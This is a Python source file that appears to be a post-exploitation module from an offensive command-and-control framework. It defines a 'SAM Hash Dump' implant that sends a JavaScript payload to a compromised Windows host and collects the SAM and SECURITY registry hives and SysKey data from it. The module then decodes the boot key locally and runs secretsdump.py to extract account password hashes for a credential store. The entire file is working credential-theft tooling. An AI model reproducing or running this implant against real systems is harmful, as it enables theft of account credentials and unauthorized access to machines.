import core.implant

class HashDumpSAMImplant(core.implant.Implant):

    NAME = "SAM Hash Dump"
    DESCRIPTION = "Dumps the SAM hive off the target system."
    AUTHORS = ["zerosum0x0"]

    def load(self):
        self.options.register("LPATH", "/tmp/", "local file save path")
        self.options.register("RPATH", "%TEMP%", "remote file save path")

    def run(self):
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/gather/hashdump_sam.js", self.options)

        self.dispatch(payloads, HashDumpSAMJob)

class HashDumpSAMJob(core.job.Job):

    def save_file(self, data):
        import uuid
        save_fname = self.options.get("LPATH") + "/" + uuid.uuid4().hex
        save_fname = save_fname.replace("//", "/")

        with open(save_fname, "wb") as f:
            data = self.decode_downloaded_data(data)
            f.write(data)

        return save_fname

    def report(self, handler, data, sanitize = False):
        task =  handler.get_header("Task", False)

        if task == "SAM":
            handler.reply(200)
            self.print_status("received SAM hive (%d bytes)" % len(data))
            self.sam_data = data
            return

        # if task == "SYSTEM":
        #     handler.reply(200)

        #     self.print_status("received SYSTEM hive (%d bytes)" % len(data))
        #     self.system_data = data
        #     return

        if task == "SysKey":
            handler.reply(200)

            self.print_status("received SysKey (%d bytes)" % len(data))
            self.syskey_data = data
            return

        if task == "SECURITY":
            handler.reply(200)

            self.print_status("received SECURITY hive (%d bytes)" % len(data))
            self.security_data = data
            return

        # dump sam here

        import threading
        self.finished = False
        threading.Thread(target=self.finish_up).start()
        handler.reply(200)

    def finish_up(self):

        from subprocess import Popen, PIPE, STDOUT
        # p = Popen(["which", "secretsdump.py"], stdout=PIPE)
        # path = p.communicate()[0].strip()
        # path = path.decode() if type(path) is bytes else path
        # if not path:
        #     print("Error decoding: secretsdump.py not in PATH!")
        #     return
        path = "data/bin/secretsdump/secretsdump.py"

        self.sam_file = self.save_file(self.sam_data)
        self.print_status("decoded SAM hive (%s)" % self.sam_file)

        self.security_file = self.save_file(self.security_data)
        self.print_status("decoded SECURITY hive (%s)" % self.security_file)

        # self.system_file = self.save_file(self.system_data)
        # self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
        self.syskey_data_file = self.save_file(self.syskey_data)

        tmp_syskey = ""
        self.syskey = ""
        with open(self.syskey_data_file, 'rb') as syskeyfile:
            file_contents = syskeyfile.read()

        i = 4220
        while i < 28811:
            j = i + 15
            while i < j:
                tmp_syskey += file_contents[i:i+1].decode()
                i += 2
            i += 8176

        tmp_syskey = list(map(''.join, zip(*[iter(tmp_syskey)]*2)))

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        for i in transforms:
            self.syskey += tmp_syskey[i]

        self.print_status("decoded SysKey: 0x%s" % self.syskey)

        # cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
        cmd = ['python2', path, '-sam', self.sam_file, '-bootkey', self.syskey, '-security', self.security_file, 'LOCAL']
        p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
        output = p.stdout.read().decode()
        self.shell.print_plain(output)

        cp = core.cred_parser.CredParse(self.shell, self, self.session.ip, self.session.computer)
        cp.parse_hashdump_sam(output)

        super(HashDumpSAMJob, self).report(None, "", False)

    def done(self):
        #self.display()
        pass

    def display(self):
        pass
